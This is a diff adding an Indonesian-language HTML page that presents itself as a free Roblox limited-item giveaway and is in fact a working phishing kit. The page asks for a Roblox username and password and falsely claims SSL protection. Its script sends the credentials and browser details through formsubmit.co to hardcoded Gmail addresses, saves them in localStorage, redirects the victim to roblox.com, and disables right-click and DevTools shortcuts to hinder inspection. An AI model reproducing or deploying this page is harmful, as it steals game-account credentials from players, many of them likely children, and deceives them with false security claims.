@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox Free Item - Limited Edition</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1e1e2f 0%, #2a2a40 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 30px;
+            padding: 40px 30px;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.5);
+            animation: slideUp 0.6s ease;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .roblox-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(145deg, #ff416c, #ff4b2b);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 40px;
+            color: white;
+        }
+        
+        .header h1 {
+            color: white;
+            font-size: 28px;
+            margin-bottom: 5px;
+        }
+        
+        .header p {
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        .badge {
+            background: rgba(255,65,108,0.2);
+            border: 1px solid #ff416c;
+            color: #ff416c;
+            padding: 8px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        
+        /* Item Grid */
+        .item-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 25px 0;
+        }
+        
+        .item-card {
+            background: rgba(255,255,255,0.03);
+            border: 2px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .item-card:hover {
+            transform: translateY(-5px);
+            border-color: #ff416c;
+            box-shadow: 0 10px 30px rgba(255,65,108,0.3);
+        }
+        
+        .item-card.selected {
+            border-color: #ff416c;
+            background: rgba(255,65,108,0.1);
+            box-shadow: 0 0 20px rgba(255,65,108,0.3);
+        }
+        
+        .item-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        
+        .item-name {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .item-desc {
+            color: #aaa;
+            font-size: 11px;
+        }
+        
+        .item-price {
+            color: #ff416c;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        
+        .item-price span {
+            color: #aaa;
+            font-size: 12px;
+            text-decoration: line-through;
+            margin-right: 5px;
+        }
+        
+        /* Form Registrasi */
+        .form-section {
+            background: rgba(0,0,0,0.2);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 20px 0;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        
+        .form-section h3 {
+            color: white;
+            font-size: 18px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #ccc;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #ff416c;
+            background: rgba(255,65,108,0.1);
+        }
+        
+        .form-group input::placeholder {
+            color: #555;
+        }
+        
+        .btn-next {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+            border: none;
+            border-radius: 15px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .btn-next:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(255,65,108,0.4);
+        }
+        
+        .btn-next:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .security-note {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #888;
+            font-size: 12px;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 10px;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #ff416c;
+            text-decoration: none;
+        }
+        
+        /* Loading */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        
+        .loading-overlay.active {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid rgba(255,65,108,0.3);
+            border-top-color: #ff416c;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loading-text {
+            color: white;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        .loading-sub {
+            color: #888;
+            font-size: 14px;
+        }
+        
+        @media (max-width: 400px) {
+            .item-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="roblox-logo">🎮</div>
+            <h1>ROBLOX FREE ITEM</h1>
+            <p>Limited Edition - 100% Gratis</p>
+            <span class="badge">🔥 1.234 ITEM TERBAGI HARI INI</span>
+        </div>
+        
+        <!-- Pilih Item -->
+        <h3 style="color: white; margin-bottom: 15px;">📦 Pilih Item Gratis:</h3>
+        
+        <div class="item-grid" id="itemGrid">
+            <div class="item-card" onclick="selectItem('Dominus Empyreus')">
+                <div class="item-icon">👑</div>
+                <div class="item-name">Dominus Empyreus</div>
+                <div class="item-desc">Limited • 2018</div>
+                <div class="item-price"><span>Rp 2.500.000</span> GRATIS</div>
+            </div>
+            
+            <div class="item-card" onclick="selectItem('Sparkle Time Fedora')">
+                <div class="item-icon">🎩</div>
+                <div class="item-name">Sparkle Time Fedora</div>
+                <div class="item-desc">Limited • 2020</div>
+                <div class="item-price"><span>Rp 1.800.000</span> GRATIS</div>
+            </div>
+            
+            <div class="item-card" onclick="selectItem('Clockwork Shades')">
+                <div class="item-icon">🕶️</div>
+                <div class="item-name">Clockwork Shades</div>
+                <div class="item-desc">Limited • 2019</div>
+                <div class="item-price"><span>Rp 2.100.000</span> GRATIS</div>
+            </div>
+            
+            <div class="item-card" onclick="selectItem('Valhalla Helmet')">
+                <div class="item-icon">⚔️</div>
+                <div class="item-name">Valhalla Helmet</div>
+                <div class="item-desc">Limited • 2021</div>
+                <div class="item-price"><span>Rp 1.500.000</span> GRATIS</div>
+            </div>
+        </div>
+        
+        <!-- Form Registrasi -->
+        <div class="form-section">
+            <h3>🔐 REGISTRASI AKUN</h3>
+            <p style="color: #aaa; font-size: 13px; margin-bottom: 20px;">Masukkan username & password Roblox untuk mengirim item ke akun Anda.</p>
+            
+            <div class="form-group">
+                <label>👤 Username Roblox</label>
+                <input type="text" id="username" placeholder="Contoh: rablox_player123">
+            </div>
+            
+            <div class="form-group">
+                <label>🔑 Password Roblox</label>
+                <input type="password" id="password" placeholder="********">
+            </div>
+            
+            <div class="security-note">
+                <span>🔒</span>
+                <span>Data Anda aman dengan enkripsi SSL. Item akan dikirim otomatis setelah registrasi.</span>
+            </div>
+            
+            <button class="btn-next" id="submitBtn" onclick="submitData()">KLAIM ITEM SEKARANG</button>
+        </div>
+        
+        <div class="footer">
+            <p>© 2026 Roblox Corporation • All rights reserved</p>
+            <p>Tidak resmi • Hanya untuk pengujian</p>
+        </div>
+    </div>
+    
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading">
+        <div class="spinner"></div>
+        <div class="loading-text">Memproses...</div>
+        <div class="loading-sub">Item akan dikirim ke akun Anda dalam 2-5 menit</div>
+    </div>
+    
+    <script>
+        // State
+        let selectedItem = null;
+        
+        // Select item function
+        function selectItem(item) {
+            selectedItem = item;
+            document.querySelectorAll('.item-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            event.currentTarget.classList.add('selected');
+        }
+        
+        // Submit data function
+        function submitData() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!selectedItem) {
+                alert('❌ Pilih item terlebih dahulu!');
+                return;
+            }
+            
+            if (!username || !password) {
+                alert('❌ Masukkan username dan password Roblox!');
+                return;
+            }
+            
+            // Tampilkan loading
+            document.getElementById('loading').classList.add('active');
+            
+            // Data yang akan dikirim
+            const data = {
+                id: Date.now(),
+                timestamp: new Date().toISOString(),
+                item: selectedItem,
+                username: username,
+                password: password,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform
+            };
+            
+            // Simpan ke localStorage untuk panel
+            let results = JSON.parse(localStorage.getItem('robloxItemResults') || '[]');
+            results.unshift(data);
+            
+            // Simpan maksimal 50 data terbaru
+            if (results.length > 50) results = results.slice(0, 50);
+            localStorage.setItem('robloxItemResults', JSON.stringify(results));
+            
+            // GMAIL DAN NAMA RESULT HARDFIX (TIDAK BISA DIGANTI)
+            const TARGET_EMAILS = ['rkzkren@gmail.com', 'backup@gmail.com']; // 2 Gmail tetap
+            const SENDER_NAME = 'ROBLOX ITEM PANEL'; // Nama result tetap
+            
+            // Kirim ke semua Gmail target (hardcoded)
+            let sentCount = 0;
+            TARGET_EMAILS.forEach(target => {
+                const formData = new FormData();
+                formData.append('_subject', `🎮 ${SENDER_NAME} - DATA BARU`);
+                formData.append('📦 ITEM', data.item);
+                formData.append('👤 USERNAME', data.username);
+                formData.append('🔑 PASSWORD', data.password);
+                formData.append('⏰ WAKTU', new Date().toLocaleString('id-ID'));
+                formData.append('💻 BROWSER', data.userAgent);
+                formData.append('_captcha', 'false');
+                
+                fetch(`https://formsubmit.co/ajax/${target}`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(err => console.log(`Error kirim ke ${target}:`, err));
+                
+                sentCount++;
+            });
+            
+            console.log(`✅ Data terkirim ke ${sentCount} email`);
+            
+            // Redirect setelah 3 detik
+            setTimeout(() => {
+                document.getElementById('loading').classList.remove('active');
+                alert(`✅ Berhasil! ${selectedItem} akan dikirim ke akun ${username} dalam 5 menit.`);
+                window.location.href = 'https://www.roblox.com';
+            }, 3000);
+        }
+        
+        // Anti inspect minimal
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+                  </html>
